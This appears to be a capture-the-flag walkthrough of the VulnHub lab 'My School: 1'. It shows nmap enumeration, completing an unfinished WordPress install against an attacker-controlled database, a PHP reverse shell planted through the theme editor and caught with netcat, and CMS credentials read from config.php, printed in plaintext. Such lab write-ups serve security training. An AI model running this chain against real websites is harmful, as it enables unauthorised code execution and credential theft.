# My School: 1

- **Machine:** My School: 1
- **Download:** https://www.vulnhub.com/entry/my-school-1,604/

![](770-1.png)

---

# Setup

1. Import the `.ova` file into VirtualBox.
2. Click **Finish**.
3. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

```bash
nmap -sn 192.168.2.0/24
```

![](770-2.png)

---

## Full Nmap Scan

Run a complete scan to enumerate open ports, services, operating system details, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.107
```

![](770-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.107
```

```bash
nmap -sC -sV -A 192.168.2.107
```

---

## HTTP Enumeration

Run the HTTP enumeration NSE script.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.107
```

![](770-4.png)

---

# Web Enumeration

Visit the discovered web applications.

- http://192.168.2.107/
- http://192.168.2.107/admin/login.php
- http://192.168.2.107:8080/wp-admin/setup-config.php

![](770-5.png)

The WordPress installation is incomplete and requires database configuration.

---

# Database Enumeration and Access

## Restart MariaDB

```bash
systemctl restart mariadb
```

Verify that MySQL is listening.

```bash
netstat -nltup | grep 3306
```

![](770-6.png)

---

## Configure MariaDB

Open the MariaDB configuration.

```bash
nano /etc/mysql/mariadb.conf.d/50-server.cnf
```

![](770-7.png)

Restart MariaDB after making the required configuration changes.

```bash
systemctl restart mariadb
```

Verify the service again.

```bash
netstat -nltup | grep 3306
```

![](770-8.png)

---

## Login to MySQL

```bash
mysql -u root -p
```

Create a new database.

```sql
CREATE DATABASE armour_db;
```

Create a new database user.

```sql
CREATE USER 'armour'@'localhost' IDENTIFIED BY 'password';
```

Grant privileges.

```sql
GRANT ALL ON armour_db.* TO 'armour'@'%' IDENTIFIED BY 'password' WITH GRANT OPTION;
```

Reload privileges.

```sql
FLUSH PRIVILEGES;
```

Exit MySQL.

```sql
EXIT;
```

![](770-9.png)

---

# Configure WordPress

Visit the WordPress setup page.

- http://192.168.2.107:8080/wp-admin/setup-config.php

![](770-10.png)

Fill in the database information created previously.

![](770-11.png)

![](770-12.png)

Complete the installation.

![](770-13.png)

Login to the WordPress dashboard.

![](770-14.png)

![](770-15.png)

---

# Reverse Shell via Theme Editor

Navigate to:

```text
Appearance → Theme Editor → 404.php
```

Replace the contents of **404.php** with a PHP reverse shell.

> **Note:** Update the attacker's IP address and listening port before saving the file.

Save and update the theme.

![](770-16.png)

---

# Obtain Reverse Shell

Start a Netcat listener.

```bash
nc -nlvp 1234
```

Trigger the payload by visiting:

```text
http://192.168.2.107:8080/wp-content/themes/twentyseventeen/404.php
```

A reverse shell is received.

![](770-17.png)

---

# Post Exploitation

Navigate to the user's home directory.

```bash
cd /home/armour
```

List the files.

```bash
ls
```

Read the user flag.

```bash
cat user.txt
```

![](770-18.png)

---

# Discover CMS Credentials

Navigate to the web root.

```bash
cd /var/www/html
```

```bash
ls
```

Navigate to the CMS directory.

```bash
cd cmsms
```

List the files.

```bash
ls
```

Read the configuration file.

```bash
cat config.php
```

![](770-19.png)

Recovered credentials:

```text
Username : armour
Password : SW)#$of4-9056d
```

---

# CMS Login

Login to the admin portal.

```text
URL : http://192.168.2.107/admin/login.php

Username : armour
Password : SW)#$of4-9056d
```

![](770-20.png)

Successfully authenticated to the CMS administration panel.

![](770-21.png)

---

# Key Learning

- Enumerate all available web applications and ports.
- Misconfigured WordPress installations can sometimes be completed by an attacker.
- Creating a new database and configuring WordPress can provide administrator access.
- Theme editors can be abused to execute arbitrary PHP code.
- Configuration files often contain credentials for other services.
- Always enumerate web application configuration files after obtaining a shell.

---

# Summary

The attack began by identifying an incomplete WordPress installation on port **8080**. After configuring a new MariaDB database, the WordPress installation was completed, providing administrator access. The theme editor was then used to upload a PHP reverse shell, resulting in remote code execution. Post-exploitation revealed additional credentials stored in the **CMS Made Simple** configuration file, which allowed successful authentication to the administrative interface on port **80**.